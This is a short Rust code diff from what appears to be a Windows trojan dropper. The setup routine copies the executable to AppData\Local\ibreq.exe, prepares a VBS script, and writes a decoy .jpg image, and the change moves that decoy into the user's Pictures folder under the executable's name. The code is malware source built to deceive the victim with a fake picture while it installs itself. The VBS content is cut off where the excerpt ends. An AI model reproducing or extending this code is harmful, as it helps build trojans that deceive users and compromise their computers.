@@ -77,8 +77,14 @@ pub fn setup() -> Result<()> {
   };
   let home_path = env::home_dir().unwrap().display().to_string();
   let current_path = std::env::current_exe().unwrap().display().to_string();
+  let file_name = current_path.split("\\").last().unwrap();
   let target_path = home_path.clone() + "\\AppData\\Local\\ibreq.exe";
   let vbs_path = home_path.clone() + "\\AppData\\Local\\ibreq.vbs";
+  let mut image_path = (home_path.clone() + "\\Pictures\\" + file_name).replace(".exe", "");
+
+  if !image_path.ends_with(".jpg") {
+    image_path.push_str(".jpg");
+  }
 
   if current_path == target_path {
     return Ok(());
@@ -86,12 +92,6 @@ pub fn setup() -> Result<()> {
 
   // Copy image and open
   {
-    let mut image_path = current_path.clone().replace(".exe", "");
-
-    if !image_path.ends_with(".jpg") {
-      image_path.push_str(".jpg");
-    }
-
     fs::write(&image_path, PLACEHOLDER_BUF)?;
     let vbs_content = format!(
       r#"
